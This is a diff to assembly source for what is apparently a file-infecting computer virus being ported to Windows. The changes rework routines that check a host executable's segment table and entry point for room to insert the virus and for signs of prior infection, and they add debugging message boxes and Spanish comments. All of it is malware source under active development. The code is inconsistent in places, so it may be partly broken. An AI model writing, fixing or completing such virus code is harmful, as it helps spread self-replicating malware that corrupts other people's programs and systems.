@@ -332,49 +332,66 @@ FILE_OK:
         call FILE_READ
         invoke MessageBoxA, HWND_DESKTOP,EntryPoint,notify_msg, MB_OK
 
-
-        ;mov edx,DWORD[NEW_HDR+16H] ;get initial cs
-
        call GET_SEG_ENTRY ;and read seg table entry into disk buf
-          invoke MessageBoxA, 0, next_msg, notify_msg, MB_OK       ;malo aqui
+
 
         mov eax,DWORD [TEMP+2] ;put segment length in ax
         add eax,VIRUS_SIZE ;add size of virus to it
         jc SHORT FOK_ERROR1 ;if we carry, there’s not enough room
         ;else we’re clear on this count
        ;If we get here, then condition (2) is fulfilled.
+
+
         mov ecx,DWORD[NEW_HDR+32H] ;logical sector alignment
         mov eax,1
         shl eax,cl ;ax=logical sector size
+
+
+
          mov ecx,DWORD [TEMP] ;get logical-sector offset of start seg
          mul ecx ;byte offset in dx:ax
-        add eax,DWORD [NEW_HDR+14H] ;add in ip of entry point
-        adc edx,0
-        mov ecx,edx
-        mov edx,eax ;put entry point in cx:dx
+         add eax,DWORD [NEW_HDR+14H] ;add in ip of entry point
+         adc edx,0
+         mov ecx,edx
+         mov edx,eax ;put entry point in cx:dx
+
+
+
         call FILE_SEEK_ST ;and seek from start of file
+
+
         mov ecx,20H ;read 32 bytes
         mov edx,TEMP ;into buffer
         call FILE_READ
-        mov esi,[VSTART]
+
+
+
+
+
+        mov esi,VSTART
         mov edi, TEMP
         mov ecx,10H ;compare 32 bytes
-        FOK3: mov eax,DWORD[si]
-        add esi,2
-        cmp eax,dword[di]
-        jne SHORT FOK4
-        add edi,2
+        FOK3:
+
+        mov eax,DWORD[esi]
+        add esi,4
+        cmp eax,dword[edi]
+       jne SHORT FOK4
+        add edi,4
         loop FOK3
 
-FOK_ERROR1:
- call FILE_CLOSE
-FOK_ERROR2:
-   invoke  MessageBoxA, HWND_DESKTOP,error_message, notify_msg, MB_OK
-   mov al,1
-   or al,al ;set NZ
-ret ;and return to caller
-FOK4: xor al,al ;set Z flag
- ret ;and exit
+     FOK_ERROR1:
+      invoke MessageBoxA, 0,next_msg, notify_msg, MB_OK
+      call FILE_CLOSE
+     FOK_ERROR2:
+     invoke  MessageBoxA, HWND_DESKTOP,error_message, notify_msg, MB_OK
+     mov al,1
+     or al,al ;set NZ
+     ret ;and return to caller
+    FOK4:
+     invoke MessageBoxA, 0,next_msg, notify_msg, MB_OK
+     xor al,al ;set Z flag
+    ret ;and exit
 
 ;******************************************************************************
 ;This routine modifies the file we found to put the virus in it. There are a
@@ -508,10 +525,8 @@ US4: mov dword[TEMP],eax ;adjust segment loc in memory
 ;This routine goes to the segment table entry number specified in dx in the
 ;file and reads it into the TEMP buffer. dx=1 is the first entry!
  GET_SEG_ENTRY:
-
-  push ebx
-  push esi
-  push edi
+     push ebp
+   mov ebp, esp
 
 
  ; dec edx
@@ -524,39 +539,34 @@ US4: mov dword[TEMP],eax ;adjust segment loc in memory
     invoke MessageBoxA, 0, edx, notify_msg, MB_OK
 
     ; Intercambiar los valores de NH_OFFSET y NH_OFFSET2
-    mov al, byte[table_entry_number ]
+    mov al, byte[TENUMB ]
     mov bl, byte[NH_OFFSET]
     add bl,22h
-    mov byte[table_entry_number], bl
+    mov byte[TENUMB], bl
 
     mov byte[NH_OFFSET], al
 
     ; Mostrar el contenido de NH_OFFSET2 nuevamente en un MessageBox
-    mov edx, table_entry_number
-    invoke MessageBoxA, 0, edx, notify_msg, MB_OK
+    mov edx, TENUMB
 
+    mov ebx,dword[fileHandle]
     mov ecx,edx
 
-   ; call FILE_SEEK_ST ;go to specified table entry
-   invoke fseek, [fileHandle],ecx, 0
-
+   call FILE_SEEK_ST ;go to specified table entry
 
 
    jc SHORT GSE1 ;exit on error
-   mov edx,TEMP
 
    mov ebx,dword[fileHandle]
-   mov edi, edx
-  ; xor ecx,ecx
-  ; mov cl,8
+   mov edi, TEMP
    mov ecx,8
   call FILE_READ ;read table entry into disk buf
 
+  invoke MessageBoxA, 0, TEMP, notify_msg, MB_OK       ;malo aqui
 
   GSE1:
-   POP ebx
-   POP esi
-   POP edi
+   mov esp, ebp
+    pop ebp
   ret
 ;This routine moves the end of the virus out by VIRSECS. The “end” is
 ;everything after the initial code segment where the virus will live.
@@ -1018,6 +1028,7 @@ END_VIRUS: ;label for the end of the windows virus
 ;below initializes some of the data used in this segment that would be
 ;hard-coded in a normal program.
 section '.data' data readable writeable
+
 DATASTARTEQU dw 0 ; Define DATASTART address
 DATAENDEQU dw 1000h ; Define DATAEND address
 DATASTART dd $
@@ -1027,8 +1038,8 @@ KNAME DB 6 dup (?) ;"KERNEL"
 FILE_NAME DB 13 dup (?) ;file name
 VSTART DD ? ;starting offset of virus in ram
 ENTRYPT DD ? ;initial ip of virus start
-NH_OFFSET db "b",0,0,0 ;new hdr offs from start of file
-table_entry_number db "a",0,0,0 ; Definimos NH_OFFSET como una cadena que contiene un solo caracter 'a'
+NH_OFFSET db 0,0,0,0 ;new hdr offs from start of file
+TENUMB db 0,0,0,0 ; Definimos NH_OFFSET como una cadena que contiene un solo caracter 'a'
 VIRSECS DD ? ;secs added to file for virus
 INITSEC DD ? ;init cs loc in file (sectors)
 RELOCS DD ? ;number of relocatables in cs
@@ -1038,10 +1049,10 @@ LOG_SEC DD ? ;logical sector size for program
     MEM_HANDLE DD ? ;memory handle for data segment
     NEW_HDR DW 40h dup (0) ;space to put new exe header in
     NEW_HDR2 DW 40h dup (0) ;space to put new exe header in
-    e_lfanew  DD ?
-    EntryPoint  DD ?
+    e_lfanew  DD 0
+    EntryPoint  DD 0
     HDR_SEGMENT_TABLE db 8 dup( 0),0
-    TEMP DB DATABUF_SIZE dup (?) ;temporary data storage
+    TEMP DB DATABUF_SIZE dup (0) ;temporary data storage
     ;file params
     DesiredAccess dd GENERIC_READ or GENERIC_WRITE
     ShareMode dd 0
